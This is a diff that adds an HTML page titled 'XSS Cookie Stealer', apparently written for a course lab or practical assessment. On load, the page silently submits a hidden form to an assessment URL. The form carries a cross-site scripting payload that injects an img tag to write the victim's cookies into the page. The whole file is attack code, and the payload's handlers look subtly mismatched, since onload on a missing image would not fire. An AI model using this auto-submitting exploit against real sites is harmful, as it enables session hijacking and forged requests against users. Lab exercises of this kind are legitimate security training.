@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS Cookie Stealer</title>
+</head>
+<body>
+    <!-- This form submits the XSS payload via POST -->
+    <form id="xssForm" action="https://inte2102.semiregular.space/Practical_Assessment/1/XSS/%7B150d2d66-6d6e-48a6-95b9-bc9a3fffccac%7D/ex7/" method="POST">
+        <!-- Hidden input carrying the XSS payload -->
+        <input type="hidden" name="text" value="&lt;img src=&quot;invalid.jpg&quot; onload=&quot;this.onerror=null;document.body.innerHTML=document.cookie&quot;&gt;">
+    </form>
+    <script>
+        // Automatically submit the form when the page loads
+        document.getElementById('xssForm').submit();
+    </script>
+</body>
+</html>
